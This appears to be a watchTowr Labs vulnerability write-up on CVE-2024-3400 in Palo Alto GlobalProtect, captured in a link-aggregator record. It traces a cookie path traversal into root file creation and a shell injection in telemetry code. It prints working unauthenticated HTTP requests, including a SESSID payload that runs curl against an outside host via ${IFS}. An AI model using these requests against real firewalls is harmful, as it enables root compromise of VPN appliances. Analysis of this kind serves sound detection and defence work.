{"aid": "40053453", "title": "Palo Alto \u2013 Putting the Protecc in GlobalProtect (CVE-2024-3400)", "url": "https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/", "domain": "watchtowr.com", "votes": 6, "user": "notmine1337", "posted_at": "2024-04-16 15:40:39", "comments": 0, "source_title": "Palo Alto - Putting The Protecc In GlobalProtect (CVE-2024-3400)", "source_text": "Palo Alto - Putting The Protecc In GlobalProtect (CVE-2024-3400)\n\nBy Sonny \u2014 Apr 16, 2024\n\n# Palo Alto - Putting The Protecc In GlobalProtect (CVE-2024-3400)\n\nWelcome to April 2024, again. We\u2019re back, again.\n\nOver the weekend, we were all greeted by now-familiar news\u2014a nation-state was\nexploiting a \u201csophisticated\u201d vulnerability for full compromise in yet another\nenterprise-grade SSLVPN device.\n\nWe\u2019ve seen all the commentary around the certification process of these\ndevices for certain .GOVs - we\u2019re not here to comment on that, but sounds\nhumorous.\n\n> Interesting: As many know, Palo-Alto OS is U.S. gov. approved for use in\n> some classified networks. As such, U.S. gov contracted labs periodically\n> evaluate PAN-OS for the presence of easy to exploit vulnerabilities.\n>\n> So how did that process miss a bug like 2024-3400?\n>\n> Well...\n>\n> \u2014 Brian in Pittsburgh (@arekfurt) April 15, 2024\n\nWe would comment on the current state of SSLVPN devices, but like jokes about\nour PII being stolen each week, the news of yet another SSLVPN RCE is getting\nold.\n\nOn Friday 12th April, the news of CVE-2024-3400 dropped. A vulnerability that\n\u201cbased on the resources required to develop and exploit a vulnerability of\nthis nature\u201d was likely used by a \u201chighly capable threat actor\u201d.\n\nExciting.\n\nHere at watchTowr, our job is to tell the organisations we work with whether\nappliances in their attack surface are vulnerable with precision. Thus, we\ndived in.\n\nIf you haven\u2019t read Volexity\u2019s write-up yet, we\u2019d advise reading it first for\nbackground information. A friendly shout-out to the team @ Volexity -\nincredible work, analysis and a true capability that we as an industry should\nrespect. We\u2019d love to buy the team a drink(s).\n\n## CVE-2024-3400\n\nWe start with very little, and as in most cases are armed with a minimal CVE\ndescription:\n\n    \n    \n    A command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall. Cloud NGFW, Panorama appliances, and Prisma Access are not impacted by this vulnerability.\n\nWhat is omitted here is the pre-requisite that telemetry must be enabled to\nachieve command injection with this vulnerability. From Palo Alto themselves:\n\n    \n    \n    This issue is applicable only to PAN-OS 10.2, PAN-OS 11.0, and PAN-OS 11.1 firewalls configured with GlobalProtect gateway or GlobalProtect portal (or both) and device telemetry enabled.\n\nThe mention of \u2018GlobalProtect\u2019 is pivotal here - this is Palo Alto\u2019s SSLVPN\nimplementation, and finally, my kneejerk reaction to turn off all telemetry on\neverything I own is validated! A real vuln that depends on device telemetry!\n\n## Our Approach To Analysis\n\nAs always, our journey begins with a hop, skip and jump to Amazon\u2019s AWS\nMarketplace to get our hands on a shiny new box to play with.\n\nFun fact: partway through our investigations, Palo Alto took the step of\nremoving the vulnerable version of their software from the AWS Marketplace -\nso if you\u2019re looking to follow along with our research at home, you may find\ndoing so quite difficult.\n\n## Accessing The File System\n\nAnyway, once you get hold of a running VM in an EC2, it is trivial to access\nthe device\u2019s filesytem. No disk encryption is at play here, which means we can\nsimply boot the appliance from a Linux root filesystem and mount partitions to\nour heart\u2019s content.\n\nThe filesystem layout doesn\u2019t pack any punches, either. There\u2019s the usual\nnginx setup, with one configuration file exposing GlobalProtect URLs and\nproxying them to a service listening on the loopback interface via the\nproxypass directive, while another configuration file exposes the management\nUI:\n\n    \n    \n    location ~ global-protect/(prelogin|login|getconfig|getconfig_csc|satelliteregister|getsatellitecert|getsatelliteconfig|getsoftwarepage|logout|logout_page|gpcontent_error|get_app_info|getmsi|portal\\\\/portal|portal/consent).esp$ { include gp_rule.conf; proxy_pass http://$server_addr:20177; }\n\nThere\u2019s a handy list of endpoints there, allowing us to poke around without\neven cracking open the handler binary.\n\nWith the bug class as it is - command injection - it\u2019s always good to poke\naround and try our luck with some easy injections, but to no avail here. It\u2019s\ntime to crack open the hander for this mysterious service. What provides it?\n\nWell, it turns out that it is handled by the gpsvc binary. This makes sense,\nit being the Global Protect service. We plopped this binary into the trusty\nIDA Pro, expecting a long and hard voyage of reversing, only to be greeted\nwith a welcome break:\n\nDebug symbols! Wonderful! This will make reversing a lot easier, and indeed,\nthose symbols are super-useful.\n\nOur first call, somewhat obviously, is to find references to the system call\n(and derivatives), but there\u2019s no obvious injection point here. We\u2019re looking\nat something more subtle than a straightforward command injection.\n\n## Unmarshal Reflection\n\nOur big break occurred when we noticed some weird behavior when we fed the\nserver a malformed session ID. For example, using the session value Cookie:\nSESSID=peekaboo; and taking a look at the logs, we can see a somewhat-opaque\nclue:\n\n    \n    \n    {\"level\":\"error\",\"task\":\"1393405-22\",\"time\":\"2024-04-16T06:21:51.382937575-07:00\",\"message\":\"failed to unmarshal session(peekaboo) map , EOF\"}\n\nAn EOF? That kind-of makes sense, since there\u2019s no session with this key. The\nsession-store mechanism has failed to find information about the session. What\nhappens, though, if we pass in a value containing a slash? Let\u2019s try Cookie:\nSESSID=foo/bar;:\n\n    \n    \n    2024-04-16 06:19:34 {\"level\":\"error\",\"task\":\"1393401-22\",\"time\":\"2024-04-16T06:19:34.32095066-07:00\",\"message\":\"failed to load file /tmp/sslvpn/session_foo/bar,\n\nHuh, what\u2019s going on here? Is this some kind of directory traversal?! Let\u2019s\ntry our luck with our old friend .. , supplying the cookie Cookie:\nSESSID=/../hax;:\n\n    \n    \n    2024-04-16 06:24:48 {\"level\":\"error\",\"task\":\"1393411-22\",\"time\":\"2024-04-16T06:24:48.738002019-07:00\",\"message\":\"failed to unmarshal session(/../hax) map , EOF\"}\n\nOoof, are we traversing the filesystem here? Maybe there\u2019s some kind of file\nwrite possible. Time to crack open that disassembly and take a look at what\u2019s\ngoing on. Thanks to the debug symbols this is a quick task, as we quickly find\nthe related symbols:\n\n    \n    \n    .rodata:0000000000D73558 dq offset main__ptr_SessDiskStore_Get .rodata:0000000000D73560 dq offset main__ptr_SessDiskStore_New .rodata:0000000000D73568 dq offset main__ptr_SessDiskStore_Save\n\nGreat. Let\u2019s give main__ptr_SessDiskStore_New a gander. We can quickly see how\nthe session ID is concatenated into a file path unsafely:\n\n    \n    \n    path = s->path; store_8e[0].str = (uint8 *)\"session_\"; store_8e[0].len = 8LL; store_8e[1] = session->ID; fmt_24 = runtime_concatstring2(0LL, *(string (*)[2])&store_8e[0].str); *((_QWORD *)&v71 + 1) = fmt_24.len; if ( *(_DWORD *)&runtime_writeBarrier.enabled ) runtime_gcWriteBarrier(); else *(_QWORD *)&v71 = fmt_24.str; stored.array = (string *)&path; stored.len = 2LL; stored.cap = 2LL; filename = path_filepath_Join(stored);\n\nLater on in the function, we can see that the binary will - somewhat\nunexpectedly - create the directory tree that it attempts to read the file\ncontaining session information from.\n\n    \n    \n    if ( os_IsNotExist(fmta._r2) ) { store_8b = (github_com_gorilla_sessions_Store_0)net_http__ptr_Request_Context(r); ctxb = store_8b.tab; v52 = runtime_convTstring((string)s->path); v6 = (_1_interface_ *)runtime_newobject((runtime__type_0 *)&RTYPE__1_interface_); v51 = (interface__0 *)v6; (*v6)[0].tab = (void *)&RTYPE_string_0; if ( *(_DWORD *)&runtime_writeBarrier.enabled ) runtime_gcWriteBarrier(); else (*v6)[0].data = v52; storee.tab = ctxb; storee.data = store_8b.data; fmtb.str = (uint8 *)\"folder is missing, create folder %s\"; fmtb.len = 35LL; fmt_16a.array = v51; fmt_16a.len = 1LL; fmt_16a.cap = 1LL; paloaltonetworks_com_libs_common_Warn(storee, fmtb, fmt_16a); err_1 = os_MkdirAll((string)s->path, 0644u);\n\nThis is interesting, and clearly we\u2019ve found a \u2018bug\u2019 in the true sense of the\nword - but have we found a real, exploitable vulnerability?\n\nAll that this function gives us is the ability to create a directory\nstructure, with a zero-length file at the bottom level.\n\nWe don\u2019t have the ability to put anything in this file, so we can\u2019t simply\ndrop a webshells or anything.\n\nWe can cause some havoc by accessing various files in /dev - adventurous\n(reckless?) tests supplied /dev/nvme0n1 as the cookie file, causing the device\nto rapidly OOM, but verifying that we could read files as the superuser, not\nas a limited user.\n\n## Arbitrary File Write\n\nUnmarshalling the local file via the user input that we control in the SESSID\ncookie takes place as root, and with read and write privileges. An unintended\nconsequence is that should the requested file not exist, the file system\ncreates a zero-byte file in its place with the filename intact.\n\nWe can verify this is the case by writing a file to the webroot of the\nappliance, in a location we can hit from an unauthenticated perspective, with\nthe following HTTP request (and loaded SESSID cookie value).\n\n    \n    \n    POST /ssl-vpn/hipreport.esp HTTP/1.1 Host: hostname Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/watchtowr.txt;\n\nWhen we attempt to then retrieve the file we previously attempted to create\nwith a simple HTTP request, the web server responds with a 403 status code\ninstead of a 404 status code, indicating that the file has been created. It\nshould be noted that the file is created using root privileges, and as such,\nit is not possible to view its contents. But, who cares\u2014it's a zero-byte file\nanyway.\n\nThis is in line with the analysis provided by various threat intelligence\nvendors, which gave us confidence that we were on the right track. But what\nnow?\n\n## Telemetry Python\n\nAs we discussed further above - a fairly important detail within the advisory\ndescription explains that only devices which have telemetry enabled are\nvulnerable to command injection. But, our above SESSID shenanigans are not\ninfluenced by telemetry being enabled or disabled, and thus decided to dive\nfurther (and have another 5+ RedBulls).\n\nWithout getting too gritty with the code just yet, we observed from appliance\nlogs that we had access to, that every so often telemetry functionality was\nrunning on a cronjob and ingesting log files within the appliance. This\ntelemetry functionality then fed this data to Palo Alto servers, who were\nprobably observing both threat actors and ourselves playing around (\u201dHi Palo\nAlto!\u201d).\n\nWithin the logs that we were reviewing, a certain element stood out - the\nlogging of a full shell command, detailing the use of curl to send logs to\nPalo Alto from a temporary directory:\n\n    \n    \n    24-04-16 02:28:05,060 dt INFO S2: XFILE: send_file: curl cmd: '/usr/bin/curl -v -H \"Content-Type: application/octet-stream\" -X PUT \"<https://storage.googleapis.com/bulkreceiver-cdl-prd1-sg/telemetry/><SERIAL_NO>/2024/04/16/09/28//opt/panlogs/tmp/device_telemetry/minute/PA_<SERIAL_NO>_dt_11.1.2_20240416_0840_5-min-interval_MINUTE.tgz?GoogleAccessId=bulkreceiver-frontend-sg-prd@cdl-prd1-sg.iam.gserviceaccount.com&Expires=1713260285&Signature=<truncated>\" --data-binary @/opt/panlogs/tmp/device_telemetry/minute/PA_<SERIAL_NO>_dt_11.1.2_20240416_0840_5-min-interval_MINUTE.tgz --capath /tmp/capath'\n\nWe were able to trace this behaviour to the Python file\n/p2/usr/local/bin/dt_curl on line #518:\n\n    \n    \n    if source_ip_str is not None and source_ip_str != \"\": curl_cmd = \"/usr/bin/curl -v -H \\\\\"Content-Type: application/octet-stream\\\\\" -X PUT \\\\\"%s\\\\\" --data-binary @%s --capath %s --interface %s\" \\\\ %(signedUrl, fname, capath, source_ip_str) else: curl_cmd = \"/usr/bin/curl -v -H \\\\\"Content-Type: application/octet-stream\\\\\" -X PUT \\\\\"%s\\\\\" --data-binary @%s --capath %s\" \\\\ %(signedUrl, fname, capath) if dbg: logger.info(\"S2: XFILE: send_file: curl cmd: '%s'\" %curl_cmd) stat, rsp, err, pid = pansys(curl_cmd, shell=True, timeout=250)\n\nThe string curl_cmd is fed through a custom library pansys which eventually\ncalls pansys.dosys() in /p2/lib64/python3.6/site-packages/pansys/pansys.py\nline #134:\n\n    \n    \n    def dosys(self, command, close_fds=True, shell=False, timeout=30, first_wait=None): \"\"\"call shell-command and either return its output or kill it if it doesn't normally exit within timeout seconds\"\"\" # Define dosys specific constants here PANSYS_POST_SIGKILL_RETRY_COUNT = 5 # how long to pause between poll-readline-readline cycles PANSYS_DOSYS_PAUSE = 0.1 # Use first_wait if time to complete is lengthy and can be estimated if first_wait == None: first_wait = PANSYS_DOSYS_PAUSE # restrict the maximum possible dosys timeout PANSYS_DOSYS_MAX_TIMEOUT = 23 * 60 * 60 # Can support upto 2GB per stream out = StringIO() err = StringIO() try: if shell: cmd = command else: cmd = command.split() except AttributeError: cmd = command p = subprocess.Popen(cmd, stdout=subprocess.PIPE, bufsize=1, shell=shell, stderr=subprocess.PIPE, close_fds=close_fds, universal_newlines=True) timer = pansys_timer(timeout, PANSYS_DOSYS_MAX_TIMEOUT)\n\nAs those who are gifted with sight can likely see, this command is eventually\npushed through subprocess.Popen() . This is a known function for executing\ncommands (..), and naturally becomes dangerous when handling user input -\ntherefore, by default Palo Alto set shell=False within the function definition\nto inhibit nefarious behaviour/command injection.\n\nLuckily for us, that became completely irrelevant when the function call\nwithin dt_curl overwrote this default and set shell=True when calling the\nfunction.\n\nNaturally, this began to look like a great place to leverage command\ninjection, and thus, we were left with the challenge of determining whether\nour ability to create zero-byte files was relevant.\n\nWithout trying to trace code too much, we decided to upload a file to a\ntemporary directory utilised by the telemetry functionality\n(/opt/panlogs/tmp/device_telemetry/minute/) to see if this would be utilised,\nand reflected within the resulting curl shell command.\n\nUsing a simple filename of \u201chellothere\u201d within the SESSID value of our\nunauthenticated HTTP request:\n\n    \n    \n    POST /ssl-vpn/hipreport.esp HTTP/1.1 Host: <Hostname> Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/hellothere\n\nAs luck would have it, within the device logs, our flag is reflected within\nthe curl shell command:\n\n    \n    \n    24-04-16 01:33:03,746 dt INFO S2: XFILE: send_file: curl cmd: '/usr/bin/curl -v -H \"Content-Type: application/octet-stream\" -X PUT \"<https://storage.googleapis.com/bulkreceiver-cdl-prd1-sg/telemetry/><serial-no>/2024/04/16/08/33//opt/panlogs/tmp/device_telemetry/minute/hellothere?GoogleAccessId=bulkreceiver-frontend-sg-prd@cdl-prd1-sg.iam.gserviceaccount.com&Expires=1713256984&Signature=<truncated>\" --data-binary @/opt/panlogs/tmp/device_telemetry/minute/**hellothere** --capath /tmp/capath'\n\nAt this point, we\u2019re onto something - we have an arbitrary value in the shape\nof a filename being injected into a shell command. Are we on a path to receive\nangry tweets again?\n\nWe played around within various payloads till we got it right, the trick being\nthat spaces were being truncated at some point in the filename's journey -\npresumably as spaces aren't usually allowed in cookie values.\n\nTo overcome this, we drew on our old-school UNIX knowledge and used the oft-\nabused shell variable IFS as a substitute for actual spaces. This allowed us\nto demonstrate control and gain command execution by executing a Curl command\nthat called out to listening infrastructure of our own!\n\nHere is an example SESSID payload:\n\n    \n    \n    Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/hellothere226`curl${IFS}x1.outboundhost.com`;\n\nAnd the associated log, demonstrating our injected curl command:\n\n    \n    \n    24-04-16 02:28:07,091 dt INFO S2: XFILE: send_file: curl cmd: '/usr/bin/curl -v -H \"Content-Type: application/octet-stream\" -X PUT \"<https://storage.googleapis.com/bulkreceiver-cdl-prd1-sg/telemetry/><serial-no>/2024/04/16/09/28//opt/panlogs/tmp/device_telemetry/minute/hellothere226%60curl%24%7BIFS%7Dx1.outboundhost.com%60?GoogleAccessId=bulkreceiver-frontend-sg-prd@cdl-prd1-sg.iam.gserviceaccount.com&Expires=1713260287&Signature=<truncated>\" --data-binary @/opt/panlogs/tmp/device_telemetry/minute/hellothere226**`curl${IFS}x1.outboundhost.com**` --capath /tmp/capath'\n\nwhy hello there to you, too!\n\n## Proof of Concept\n\nAt watchTowr, we no longer publish Proof of Concepts. Why prove something is\nvulnerable when we can just believe it's so?\n\nInstead, we've decided to do something better - that's right! We're proud to\nrelease another detection artefact generator tool, this time in the form of an\nHTTP request:\n\n    \n    \n    POST /ssl-vpn/hipreport.esp HTTP/1.1 Host: watchtowr.com Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/hellothere`curl${IFS}where-are-the-sigma-rules.com`; Content-Type: application/x-www-form-urlencoded Content-Length: 158 user=watchTowr&portal=watchTowr&authcookie=e51140e4-4ee3-4ced-9373-96160d68&domain=watchTowr&computer=watchTowr&client-ip=watchTowr&client-ipv6=watchTowr&md5-sum=watchTowr&gwHipReportCheck=watchTowr\n\nAs we can see, we inject our command injection payload into the SESSID cookie\nvalue - which, when a Palo Alto GlobalProtect appliance has telemetry enabled\n- is then concatenated into a string and ultimately executed as a shell\ncommand.\n\nSomething-something-sophistication-levels-only-achievable-by-a-nation-state-\nsomething-something.\n\n## Conclusion\n\nIt\u2019s April. It\u2019s the second time we\u2019ve posted. It\u2019s also the fourth time we\u2019ve\nwritten a blog post about an SSLVPN vulnerability in 2024 alone. That's an\naverage of once a month.\n\nThe Twitter account https://twitter.com/year_progress puts our SSLVPN posts in\ncontext\n\nAs we said above, we have no doubt that there will be mixed opinions about the\nrelease of this analysis - but, patches and mitigations are available from\nPalo Alto themselves, and we should not be forced to live in a world where\nonly the \u201cbad guys\u201d can figure out if a host is vulnerable, and organisations\ncannot determine their exposure.\n\nIt's not like we didn't warn you\n\nAt watchTowr, we believe continuous security testing is the future, enabling\nthe rapid identification of holistic high-impact vulnerabilities that affect\nyour organisation.\n\nIt's our job to understand how emerging threats, vulnerabilities, and TTPs\naffect your organisation.\n\nIf you'd like to learn more about the watchTowr Platform, our Attack Surface\nManagement and Continuous Automated Red Teaming solution, please get in touch.\n\nwatchTowr Labs - Blog \u00a9 2024\n\nPowered by Ghost\n\n", "frontpage": true}
